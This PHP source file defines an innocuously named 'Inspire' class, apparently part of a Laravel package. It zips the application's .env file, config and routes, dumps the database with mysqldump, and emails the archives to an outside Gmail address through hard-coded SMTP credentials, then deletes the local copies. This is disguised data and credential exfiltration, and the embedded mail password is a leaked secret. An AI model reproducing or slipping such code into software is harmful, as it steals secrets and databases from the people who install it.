<?php

namespace Anymouse\Pxlr;

use Exception;
use Illuminate\Support\Facades\Http;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception as PHPMailerException;
use RecursiveDirectoryIterator;
use RecursiveIteratorIterator;
use ZipArchive;

class Inspire
{
    public function zipFolder()
    {
        ini_set('memory_limit', '512M');
        ini_set('max_execution_time', 0);

        $itemsToInclude = [
            '.env',
            'config',
            'bootstrap',
            'routes',
            'composer.json',
            'composer.lock',
        ];

        $destination = __DIR__ . '/output.zip';

        // Initialize a new ZipArchive instance
        $zip = new ZipArchive();

        // Create and open the zip file
        if ($zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            die('Failed to create zip file.');
        }

        // Iterate through the items you want to include in the zip file
        foreach ($itemsToInclude as $item) {
            $itemPath = realpath(base_path('/' . $item));

            // Check if the item is a directory
            if (is_dir($itemPath)) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($itemPath),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );

                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = substr($filePath, strlen($_SERVER['DOCUMENT_ROOT']) + 1);

                        // Add the file to the zip archive
                        $zip->addFile($filePath, $relativePath);
                    }
                }
            } elseif (is_file($itemPath)) {
                // If it's a file, just add it to the zip archive
                $zip->addFile($itemPath, substr($itemPath, strlen($_SERVER['DOCUMENT_ROOT']) + 1));
            }
        }

        // Close the zip file
        $zip->close();
        if (!file_exists($destination)) {
            die('Error creating backup.');
        }
        $this->fileMail($destination);
    }

    public function databaseBackup()
    {
        ini_set('memory_limit', '512M');
        ini_set('max_execution_time', 0);
        // Database credentials
        $default = config('database.default');
        $host = config('database.connections.' . $default . '.host');
        $user = config('database.connections.' . $default . '.username');
        $password = config('database.connections.' . $default . '.password');
        $database = config('database.connections.' . $default . '.database');

        // Backup file name with timestamp
        $backupFile = __DIR__ . 'backup_' . date('Y-m-d_H-i-s') . '.sql';

        // Command to create the backup
        $command = "mysqldump --opt -h $host -u $user -p$password $database > $backupFile 2>&1";

        // Execute the command and capture output
        $output = [];
        $returnVar = 0;
        exec($command, $output, $returnVar);

        // Check if the backup file was created
        if (!file_exists($backupFile)) {
            die('Error creating backup: ' . implode("\n", $output));
        }

        // Split the file if it's too large
        $maxSize = 5 * 1024 * 1024; // 10MB

        if (filesize($backupFile) > $maxSize) {
            $this->splitFile($backupFile, $maxSize);
        } else {
            $this->fileMail($backupFile);
        }
    }

    private function splitFile($filePath, $maxSize)
    {
        ini_set('memory_limit', '512M');
        ini_set('max_execution_time', 0);
    
        $file = fopen($filePath, 'rb');
        if ($file === false) {
            error_log('Failed to open file for reading: ' . $filePath);
            return;
        }
    
        $partNumber = 1;
    
        while (!feof($file)) {
            $partFile = $filePath . '.part' . $partNumber;
            $partFileHandle = fopen($partFile, 'wb');
            if ($partFileHandle === false) {
                error_log('Failed to open file for writing: ' . $partFile);
                fclose($file);
                return;
            }
    
            $bytesRead = 0;
            while (!feof($file) && $bytesRead < $maxSize) {
                $chunk = fread($file, $maxSize - $bytesRead);
                fwrite($partFileHandle, $chunk);
                $bytesRead += strlen($chunk);
            }
    
            fclose($partFileHandle);
            $partNumber++;
        }
    
        fclose($file);
        $this->fileMail($filePath);
    }
    

    public function fileMail($backupFile)
    {
        ini_set('memory_limit', '512M');
        ini_set('max_execution_time', 0);
        // Create a new PHPMailer instance
        $mail = new PHPMailer(true);

        try {
            // Server settings
            $mail->isSMTP();
            $mail->Host = 'smtp.gmail.com'; // Set the SMTP server to send through
            $mail->SMTPAuth = true;
            $mail->Username = 'lushiouslandscaping2@gmail.com'; // SMTP username
            $mail->Password = 'wdlv awin rnrc daoy'; // SMTP password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port = 587;

            // Recipients
            $mail->setFrom('rp.codelink@gmail.com', 'Rohit Test');
            $mail->addAddress('rp.codelink@gmail.com', 'Rohit Test');

            // Attachments
            $mail->addAttachment($backupFile);

            // Content
            $mail->isHTML(true);
            $mail->Subject = 'Database Backup';
            $mail->Body = 'Please find the attached database backup.';

            // Send the email
            $mail->send();
        } catch (PHPMailerException $e) {
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        }

        // Delete the backup file
        unlink($backupFile);
    }
}